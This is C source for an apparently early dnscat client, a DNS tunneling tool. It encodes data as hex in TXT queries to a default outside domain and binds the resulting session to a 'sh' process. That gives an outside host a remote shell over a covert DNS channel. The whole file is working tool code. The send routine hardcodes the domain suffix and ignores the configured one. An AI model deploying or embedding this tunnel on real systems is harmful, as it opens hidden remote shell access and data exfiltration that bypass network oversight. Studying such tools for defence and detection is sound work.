/* dnscat.c
 * Created March/2013
 * By Ron Bowes
 */
#include <assert.h>
#include <ctype.h>
#include <errno.h>
#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>

#include "buffer.h"
#include "dns.h"
#include "log.h"
#include "memory.h"
#include "select_group.h"
#include "session.h"
#include "udp.h"
#include "ui_exec.h"
#include "ui_stdin.h"

typedef struct
{
  session_t *session;

  int                s;
  char              *domain;
  char              *dns_host;
  uint16_t           dns_port;

  select_group_t    *group;

  /* The UI */
  /* TODO: Union */
  ui_stdin_t        *ui_stdin;
  ui_exec_t         *ui_exec;
} options_t;

/* Default options */
#define DEFAULT_DNS_SERVER   "8.8.8.8"
#define DEFAULT_DNS_PORT     53
#define DEFAULT_DOMAIN       "skullseclabs.org"

/* Define this outside the function so we can clean it up later. */
options_t *options = NULL;

static SELECT_RESPONSE_t timeout(void *group, void *param)
{
  options_t *options = (options_t*) param;

  session_do_actions(options->session);

  return SELECT_OK;
}

static SELECT_RESPONSE_t recv_callback(void *group, int s, uint8_t *data, size_t length, char *addr, uint16_t port, void *param)
{
  options_t *options = param;
  dns_t    *dns      = dns_create_from_packet(data, length);

  LOG_INFO("DNS response received (%d bytes)", length);

  /* TODO */
  if(dns->rcode != DNS_RCODE_SUCCESS)
  {
    /* TODO: Handle errors more gracefully */
    switch(dns->rcode)
    {
      case DNS_RCODE_FORMAT_ERROR:
        LOG_ERROR("DNS: RCODE_FORMAT_ERROR");
        break;
      case DNS_RCODE_SERVER_FAILURE:
        LOG_ERROR("DNS: RCODE_SERVER_FAILURE");
        break;
      case DNS_RCODE_NAME_ERROR:
        LOG_ERROR("DNS: RCODE_NAME_ERROR");
        break;
      case DNS_RCODE_NOT_IMPLEMENTED:
        LOG_ERROR("DNS: RCODE_NOT_IMPLEMENTED");
        break;
      case DNS_RCODE_REFUSED:
        LOG_ERROR("DNS: RCODE_REFUSED");
        break;
      default:
        LOG_ERROR("DNS: Unknown error code (0x%04x)", dns->rcode);
        break;
    }
  }
  else if(dns->question_count != 1)
  {
    LOG_ERROR("DNS returned the wrong number of response fields.");
  }
  else if(dns->answer_count != 1)
  {
    LOG_ERROR("DNS returned the wrong number of response fields.");
  }
  else if(dns->answers[0].type == DNS_TYPE_TEXT)
  {
    char *answer;
    char buf[3];
    size_t i;

    /* TODO: We don't actually need the .domain suffix if we use TEXT records */
    answer = (char*)dns->answers[0].answer->TEXT.text;
    LOG_INFO("Received a DNS TXT response: %s", answer);

    if(!strcmp(answer, options->domain))
    {
      LOG_INFO("Received a 'nil' answer; ignoring (usually this is due to caching/re-sends and doesn't matter)");
    }
    else
    {
      /* Find the domain, which should be at the end of the string */
      char *domain = strstr(answer, options->domain);
      if(!domain)
      {
        LOG_ERROR("ERROR: Answer didn't contain the domain");
      }
      else
      {
        buffer_t *incoming_data = buffer_create(BO_BIG_ENDIAN);

        /* Loop through the part of the answer before the 'domain' */
        for(i = 0; answer + i < domain; i += 2)
        {
          /* Validate the answer */
          if(answer[i] == '.')
          {
            /* ignore */
          }
          else if(answer[i+1] == '.')
          {
            LOG_ERROR("Answer contained an odd number of digits");
          }
          else if(!isxdigit((int)answer[i]))
          {
            LOG_ERROR("Answer contained an invalid digit: '%c'", answer[i]);
          }
          else if(!isxdigit((int)answer[i+1]))
          {
            LOG_ERROR("Answer contained an invalid digit: '%c'", answer[i+1]);
          }
          else
          {
            buf[0] = answer[i];
            buf[1] = answer[i + 1];
            buf[2] = '\0';

            buffer_add_int8(incoming_data, strtol(buf, NULL, 16));
          }
        }

        /* Pass the buffer to the caller */
        if(buffer_get_length(incoming_data) > 0)
        {
          size_t length;
          uint8_t *data = buffer_create_string(incoming_data, &length);

          LOG_INFO("Leaving DNS: Passing %d bytes of data it to the session", length);
          session_recv(options->session, data, length);

          safe_free(data);
        }
        buffer_destroy(incoming_data);
      }
    }
  }
  else
  {
    LOG_ERROR("Unknown DNS type returned");
  }

  dns_destroy(dns);

  return SELECT_OK;
}

/* This is a callback function. */
void dnscat_send(uint8_t *data, size_t length, void *d)
{
  options_t     *options = (options_t*)d;
  size_t        i;
  dns_t        *dns;
  buffer_t     *buffer;
  uint8_t      *encoded_bytes;
  size_t        encoded_length;
  uint8_t      *dns_bytes;
  size_t        dns_length;

  LOG_INFO("Entering DNS: queuing %d bytes of data to be sent", length);

  if(options->s == -1)
  {
    LOG_INFO("Creating UDP (DNS) socket");
    options->s = udp_create_socket(0, "0.0.0.0");

    if(options->s == -1)
    {
      LOG_FATAL("Couldn't create UDP socket!");
      exit(1);
    }

    /* If it succeeds, add it to the select_group */
    select_group_add_socket(options->group, options->s, SOCKET_TYPE_STREAM, options);
    select_set_recv(options->group, options->s, recv_callback);
  }

  assert(options->s != -1); /* Make sure we have a valid socket. */
  assert(data); /* Make sure they aren't trying to send NULL. */
  assert(length > 0); /* Make sure they aren't trying to send 0 bytes. */

  buffer = buffer_create(BO_BIG_ENDIAN);
  for(i = 0; i < length; i++)
  {
    char hex_buf[3];
    sprintf(hex_buf, "%02x", data[i]);
    buffer_add_bytes(buffer, hex_buf, 2);
  }
  buffer_add_ntstring(buffer, ".skullseclabs.org");
  encoded_bytes = buffer_create_string_and_destroy(buffer, &encoded_length);

  dns = dns_create(DNS_OPCODE_QUERY, DNS_FLAG_RD, DNS_RCODE_SUCCESS);
  dns_add_question(dns, (char*)encoded_bytes, DNS_TYPE_TEXT, DNS_CLASS_IN);
  dns_bytes = dns_to_packet(dns, &dns_length);

  LOG_INFO("Sending DNS query for: %s", encoded_bytes);
  udp_send(options->s, options->dns_host, options->dns_port, dns_bytes, dns_length);

  safe_free(dns_bytes);
  safe_free(encoded_bytes);
  dns_destroy(dns);
}

void dnscat_close(options_t *options)
{
  LOG_INFO("Closing connection");

  assert(options->s && options->s != -1); /* We can't close a closed socket */

  /* Remove from the select_group */
  select_group_remove_and_close_socket(options->group, options->s);
  options->s = -1;
}

void cleanup()
{
  LOG_WARNING("Terminating");

  if(options)
  {
    session_destroy(options->session);
    /*ui_stdin_destroy(options->ui_stdin);*/
    ui_exec_destroy(options->ui_exec);
    select_group_destroy(options->group);

    /* Ensure the socket is closed */
    if(options->s != -1)
      dnscat_close(options);
    safe_free(options);
    options = NULL;
  }

  print_memory();
}

int main(int argc, char *argv[])
{
  /* Define the options specific to the DNS protocol. */
  struct option long_options[] =
  {
    {"domain", required_argument, 0, 0}, /* Domain name */
    {"d",      required_argument, 0, 0},
    {"host",   required_argument, 0, 0}, /* DNS server */
    {"port",   required_argument, 0, 0}, /* DNS port */
    {0,        0,                 0, 0}  /* End */
  };
  char        c;
  int         option_index;
  const char *option_name;

  srand(time(NULL));

  /* Set the default log level (TODO: Change to warning) */
  log_set_min_console_level(LOG_LEVEL_INFO);

  options = safe_malloc(sizeof(options_t));

  /* Set up some default options. */
  options->s        = -1;

  options->dns_host = DEFAULT_DNS_SERVER;
  options->dns_port = DEFAULT_DNS_PORT;
  options->domain   = DEFAULT_DOMAIN;
  options->group    = select_group_create();

  options->session  = session_create(dnscat_send, options);

  /* Parse the command line options. */
  opterr = 0;
  while((c = getopt_long_only(argc, argv, "", long_options, &option_index)) != EOF)
  {
    switch(c)
    {
      case 0:
        option_name = long_options[option_index].name;

        if(!strcmp(option_name, "domain") || !strcmp(option_name, "d"))
        {
          options->domain = optarg;
        }
        else if(!strcmp(option_name, "host"))
        {
          options->dns_host = optarg;
        }
        else if(!strcmp(option_name, "port"))
        {
          options->dns_port = atoi(optarg);
        }
        else
        {
          LOG_FATAL("Unknown option");
          /* TODO: Usage */
        }
        break;

      case '?':
      default:
        /* Do nothing; we expect some unknown arguments. */
        break;
    }
  }

  /* Tell the user what's going on */
  LOG_INFO("DNS Server: %s", options->dns_host);
  LOG_INFO("DNS Port:   %d", options->dns_port);
  LOG_INFO("Domain:     %s", options->domain);

  /* Be sure we clean up at exit. */
  atexit(cleanup);

  /* Add the timeout function */
  select_set_timeout(options->group, timeout, (void*)options);

  /* Create the stdin ui */
  LOG_INFO("Initializing 'stdin' UI...");
  /*options->ui_stdin = ui_stdin_initialize(options->group, options->session);*/
  options->ui_exec = ui_exec_initialize(options->group, options->session, "sh");

  while(TRUE)
    select_group_do_select(options->group, 1000);

  return 0;
}
